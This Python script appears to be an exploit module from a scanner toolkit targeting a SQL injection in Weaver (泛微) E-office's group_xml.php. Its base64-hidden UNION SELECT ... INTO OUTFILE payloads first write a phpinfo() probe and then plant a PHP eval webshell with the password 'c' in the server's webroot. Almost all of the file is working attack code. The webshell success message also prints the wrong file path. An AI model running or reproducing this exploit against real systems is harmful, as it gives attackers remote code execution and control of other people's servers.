import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

def E_office_group_xml_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = urldata + 'inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgQGV2YWwoJF9QT1NUW2NdKT8+JywyLDMsNCw1LDYsNyw4IGludG8gb3V0ZmlsZSAnLi4vd2Vicm9vdC90ZXN0LnBocCdd'
    vuln_url = urldata + 'inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd'

    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=20)
        response_poc = requests.get(url=urldata + 'vulntest.php', headers=headers, verify=False, timeout=20)
        if response.status_code == 200:
            print(Vcolors.RED + "[!] 存在泛微OA  group_xml SQL注入:{}".format(urldata) + 'vulntest.php' +Vcolors.ENDC)
            print(Vcolors.RED + "[!] poc为:{}".format(vuln_url) + Vcolors.ENDC)
            response = requests.get(url=exp_url, headers=headers, verify=False, timeout=20)
            response_exp = requests.get(url=urldata + 'test.php', headers=headers, verify=False, timeout=20)
            if response.status_code == 200 and response_exp.status_code == 200:
                print(Vcolors.RED + "[!] 上传webshell成功，密码为c:{}".format(urldata) + 'vulntest.php' + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OA  group_xml SQL注入" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n", e)
        logging.error("E_office_group_xml_sql脚本出现异常")


  
        


